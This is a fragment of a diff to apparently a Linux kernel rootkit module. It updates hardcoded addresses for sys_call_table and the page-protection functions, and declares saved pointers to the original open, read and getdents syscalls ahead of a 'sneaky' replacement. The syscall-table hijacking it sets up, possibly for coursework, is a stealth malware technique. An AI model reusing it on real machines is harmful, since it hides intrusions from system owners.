@@ -43,14 +43,14 @@ char d_name[];
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page* page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page* page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page* page, int numpages) = (void *)0xffffffff81073190;
+void (*pages_ro)(struct page* page, int numpages) = (void *)0xffffffff81073110;
 
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
+static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 
 
 //Function pointer will be used to save address of original 'open' syscall.
@@ -59,7 +59,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //This is used for all system calls.
 asmlinkage int (*original_open)(const char* pathname, int flags, mode_t mode);
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dir_p, unsigned int count);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent* dir_p, unsigned int count);
 
 
 //Define our new sneaky version of the 'open' syscall
